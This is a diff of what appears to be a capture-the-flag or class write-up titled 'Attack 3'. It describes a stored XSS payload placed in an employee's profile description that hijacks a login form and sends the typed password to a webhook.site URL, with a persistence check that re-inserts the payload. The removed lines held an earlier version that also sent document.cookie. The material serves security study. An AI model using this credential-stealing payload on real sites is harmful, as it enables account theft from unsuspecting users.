@@ -1,26 +1,45 @@
-XSS vulnerability
+# Attack 3
 
-```html
-<script>
+This attack uses an XSS vulnerability, and changes the functionality of the submit button to send a request to our webhook.
+
+The script first executes attack 2 in order to get the session key, then it appends our javascript code to Jonas's description if it doesn't exist.
+
+From then on, every 30 seconds the script checks if the webhook has been received, if not, then it checks if the XSS vulnerability is still in the description. Updates if it's not there.
+
+We used webhook.site as our cross website.
+
+The script we wrote looks like this:
+
+```javascript
 document.addEventListener("DOMContentLoaded", () => {
     document.getElementById("authForm").addEventListener("submit", () => {
-        const key = document.getElementById("authPassword").value; 
-        fetch("//webhook.site/35ba567d-a7f8-402d-9a9d-e9803698e06c", {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                key: key,
-                blarg: document.cookie
-            })
-        });
+        const key = document.getElementById("authPassword").value;
+        fetch("//webhook.site/c60e8309-2035-4484-8777-121da40750d6?key=" + encodeURIComponent(key));
     })
 });
+```
+
+And the complete inner HTML `<textarea>` looks like this:
+
+```html
+The most friendly employee in the company
+<script>
+//eiunrg9ea8gnq780b4387
+
+document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("authForm").addEventListener("submit", () => {
+        const key = document.getElementById("authPassword").value;
+        fetch("//webhook.site/c60e8309-2035-4484-8777-121da40750d6?key=" + encodeURIComponent(key));
+    })
+});
+
 </script>
 ```
 
-After that, listen to the incomming requests to get the key.
+The id `eiunrg9ea8gnq780b4387` is used to check if the script is still in the description or not.
 
-Encoding was somehow now working correctly right away testing with `decodeURIComponent("jeg!Har%Mest&LystTil&At%V%C3%A6re-En-Hacker")` returned an error.
-It turns out the "Æ" here was encoded, giving us the final answer of `jeg!Har%Mest&LystTil&At%Være-En-Hacker`
+When a webhook is received, it should be visible in webhook.site's JSON path: https://webhook.site/token/c60e8309-2035-4484-8777-121da40750d6/requests?page=1&password=&query=&sorting=newest
+
+Located in `data["data"][0]["query"]["key"]`.
+
+The python script should then print the password in the terminal: `jeg!Har%Mest&LystTil&At%Være-En-Hacker`
